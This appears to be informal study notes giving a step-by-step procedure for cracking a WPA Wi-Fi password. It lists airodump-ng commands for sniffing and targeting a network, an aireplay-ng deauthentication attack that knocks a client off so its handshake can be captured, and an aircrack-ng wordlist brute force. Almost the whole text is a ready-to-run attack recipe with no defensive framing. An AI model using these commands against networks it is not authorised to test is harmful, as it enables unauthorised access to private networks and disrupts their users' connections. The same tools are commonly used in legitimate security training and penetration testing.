First of all run airodump.ng and capture packets as we learned.
The auth pass packet will be only if a clinet connect to the network.
We can abuse that my running deauth attack and then the client will reconnect and send the pass in the packet which
will be captured by us.

start to sniff using airodump-ng by
airodump-ng wlan0

quit by ctrl + c

airodump-ng work only 2.4ghz on deafult
in order to use it also on 5ghz and 2.4ghz use those commands
airodump-ng --band abg wlan0

to target a wifi network and a channel and save the info
airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel X --write test wlan0
use -D if your target uses 5g

a - router address
c - clinet address
wlan0 - interface

now open a new terminal and run deauth attack on one of the client who appear down
aireplay-ng --deauth 7 -a XX:XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX:XX wlan0

now you should get the WPA handshake and we will use it to brute force.
if you dont have a word list its a good time to get one!

lets start, 
aircrack-ng test.cap -w WORDLIST
